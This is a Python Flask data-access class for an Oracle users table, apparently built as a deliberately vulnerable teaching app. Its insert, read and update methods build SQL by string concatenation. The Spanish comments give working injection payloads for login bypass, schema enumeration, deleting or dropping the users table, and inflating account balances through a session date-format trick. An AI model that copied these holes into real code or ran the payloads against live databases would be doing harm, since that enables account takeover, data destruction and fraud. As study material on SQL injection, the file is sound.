import cx_Oracle
from flask import current_app as app

class DaoUsuario:
    
    def insert(self, transfer):

        # Solicitamos una conexion a la bbdd
        with cx_Oracle.connect(user=app.config["USER"], password=app.config["PASSWORD"], dsn=app.config["DATABASE_URI"]) as connection:

            # Abre un cursor para manipular la bbdd
            with connection.cursor() as cursor:
 
                '''
                Brechas de seguridad:
                
                Inserción de comandos SELECT en cualquiera de los campos, ejem:         ' || (SELECT host_name FROM v$instance) || '  ' || (SELECT version FROM v$instance) || ' 
                                                                                        ' || (SELECT t_n FROM (SELECT rownum as t_i, table_name as t_n FROM user_tables)  WHERE t_i = 1) || '

                Consultar multi-injección (por ERROR), campo de la contraseña, ejem:    12345678'); SELECT dummy FROM DUAL WHERE dummy = (' 
                
                Cerrar el INSERT INTO y añadir otros comandos en la contraseña, ejem:   12345678'); DELETE FROM USUARIOS WHERE nombre LIKE('%
                                                                                        12345678'); EXECUTE IMMEDIATE ('DROP TABLE USUARIOS CASCADE CONSTRAINTS'); DELETE FROM USUARIOS WHERE nombre LIKE('
                '''

                # Lateral SQL-Injection (Desde el campo contraseña)
                # Caso 1: robar para mí (incrementar mi saldo); Caso 2: robar para todos (subir el saldo de todos)
                # No es necesario restaurar el formato de fecha de la sesión, ya que este deja de tener validez cuando la conexión (sesión) acaba.
                # 12345678'); EXECUTE IMMEDIATE q'[ALTER SESSION SET NLS_DATE_FORMAT = ''' "UNION SELECT 1 FROM DUAL --" ']'; FOR I IN 1..1000 LOOP SORTEO(); END LOOP; DELETE FROM USUARIOS WHERE nombre LIKE('
                # 12345678'); EXECUTE IMMEDIATE q'[ALTER SESSION SET NLS_DATE_FORMAT = ''' "UNION SELECT COD FROM USUARIOS--"']'; SORTEO(); DELETE FROM USUARIOS WHERE nombre LIKE('

                cursor.execute(
                    "DECLARE "
                    "   seq INT; "
                    "BEGIN " + 
                    "   seq := usuarios_seq.nextval; " +
                    "   INSERT INTO usuarios(cod, nombre, apellidos, direccion, correo, contraseña) values(" +
                    "   seq, '" + transfer['nombre'] + "', '" + transfer['apellidos'] + "', '" + 
                    transfer['direccion'] + "', '" + transfer['correo'] + "', '" + transfer['contraseña'] + "'); " +  
                    "END;"
                )
                
            connection.commit()

    def read(self, transfer):

        user = None

        # Solicitamos una conexion a la bbdd
        with cx_Oracle.connect(user=app.config["USER"], password=app.config["PASSWORD"], dsn=app.config["DATABASE_URI"]) as connection:

            # Abre un cursor para manipular la bbdd
            with connection.cursor() as cursor:

                '''
                Brechas de seguridad: 
                Permite averiguar, yendo a ciegas, que campos tiene la tabla, para ello en el campo nombre:     ' or <fieldName> = <Value> --
                Permite saber si un usuario existe e iniciar sesión como él, para ello en el campo nombre:      ' or contraseña = '12345678' --
                Permite iniciar sesión como el primer usuario en la bbdd, para ello en el campo nombre:         ' or 1=1 --
                '''
                cursor.execute("select * from usuarios where correo = '" + transfer['correo'] + "' and contraseña = '" + transfer['contraseña'] + "'")

                row = cursor.fetchone()
                
                if row is not None:

                    user = dict()
                    user['cod'] = row[0]
                    user['nombre'] = row[1]
                    user['apellidos'] = row[2]
                    user['direccion'] = row[3]
                    user['correo'] = row[4]
                    user['contraseña'] = row[5]
                    user['saldo'] = row[6]
                    user['administrador'] = row[7]

                return user

    def update(self, transfer):

        # Solicitamos una conexion a la bbdd
        with cx_Oracle.connect(user=app.config["USER"], password=app.config["PASSWORD"], dsn=app.config["DATABASE_URI"]) as connection:

            # Abre un cursor para manipular la bbdd
            with connection.cursor() as cursor:
                
                cursor.execute(
                    "update usuarios set " +
                    "nombre = '" + transfer['nombre'] + "', " +
                    "apellidos = '" + transfer['apellidos'] + "', " +
                    "direccion = '" + transfer['direccion'] + "', " +
                    "contraseña = '" + transfer['contraseña'] + "', " +       
                    "saldo = " + str(transfer['saldo']) + " " +
                    "where correo = '" + transfer['correo'] + "'"        
                )
    
            connection.commit()
